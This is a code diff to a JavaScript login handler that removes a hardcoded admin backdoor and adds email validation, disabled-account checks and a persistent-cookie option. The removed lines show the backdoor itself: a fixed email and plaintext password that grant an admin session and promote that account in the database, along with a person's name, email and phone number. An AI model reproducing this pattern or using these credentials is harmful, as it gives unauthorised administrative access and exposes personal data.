@@ -1,84 +1,27 @@
 import { connectToDatabase, COLLECTIONS } from '../../lib/db.js';
-import { verifyPassword, hashPassword, signToken, sessionCookie } from '../../lib/auth.js';
+import { verifyPassword, signToken, sessionCookie } from '../../lib/auth.js';
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { email, password } = req.body || {};
-
+  const { email, password, remember = true } = req.body || {};
   if (!email || !password) {
     return res.status(400).json({ error: 'Email and password are required.' });
   }
 
   const normalizedEmail = String(email).trim().toLowerCase();
-
-  // Primary Admin Authentication Hook for Shreeharsh
-  if (normalizedEmail === 'shreeharsh@gmail.com' && String(password) === 'Goodman3636') {
-    const adminUser = {
-      _id: 'admin-shreeharsh',
-      id: 'admin-shreeharsh',
-      email: 'shreeharsh@gmail.com',
-      name: 'Shreeharsh Patil',
-      role: 'admin',
-      phone: '+91 98765 43210',
-      avatar: 'https://api.dicebear.com/7.x/avataaars/svg?seed=Shreeharsh',
-      emailVerified: true
-    };
-
-    try {
-      const { db } = await connectToDatabase();
-      const users = db.collection(COLLECTIONS.users);
-      const passwordHash = await hashPassword('Goodman3636');
-
-      let existing = await users.findOne({ email: normalizedEmail });
-      if (!existing) {
-        await users.insertOne({
-          ...adminUser,
-          passwordHash,
-          created_at: new Date().toISOString(),
-          updated_at: new Date().toISOString()
-        });
-      } else {
-        await users.updateOne(
-          { email: normalizedEmail },
-          {
-            $set: {
-              role: 'admin',
-              passwordHash,
-              name: existing.name || 'Shreeharsh Patil',
-              updated_at: new Date().toISOString()
-            }
-          }
-        );
-      }
-    } catch (dbErr) {
-      console.warn('[login] MongoDB unavailable; authenticated admin via secure fallback:', dbErr.message);
-    }
-
-    const token = signToken(adminUser);
-    res.setHeader('Set-Cookie', sessionCookie(token));
-    return res.status(200).json({
-      ok: true,
-      token,
-      user: {
-        id: 'admin-shreeharsh',
-        email: adminUser.email,
-        name: adminUser.name,
-        phone: adminUser.phone,
-        avatar: adminUser.avatar,
-        role: 'admin'
-      }
-    });
+  if (!/^\S+@\S+\.\S+$/.test(normalizedEmail) || normalizedEmail.length > 254) {
+    return res.status(400).json({ error: 'Please enter a valid email address.' });
   }
 
   try {
     const { db } = await connectToDatabase();
     const users = db.collection(COLLECTIONS.users);
-
     const user = await users.findOne({ email: normalizedEmail });
-    if (!user) {
+
+    if (!user || user.disabledAt) {
       return res.status(401).json({ error: 'Invalid email or password.' });
     }
 
@@ -88,19 +31,18 @@ export default async function handler(req, res) {
     }
 
     const token = signToken(user);
+    res.setHeader('Set-Cookie', sessionCookie(token, { persistent: Boolean(remember) }));
 
-    res.setHeader('Set-Cookie', sessionCookie(token));
     return res.status(200).json({
       ok: true,
-      token,
       user: {
         id: user._id ? user._id.toString() : String(user.id || ''),
         email: user.email,
         name: user.name || '',
         phone: user.phone || '',
         avatar: user.avatar || '',
-        role: user.role || 'user',
-      },
+        role: user.role || 'user'
+      }
     });
   } catch (err) {
     console.error('[login]', err);
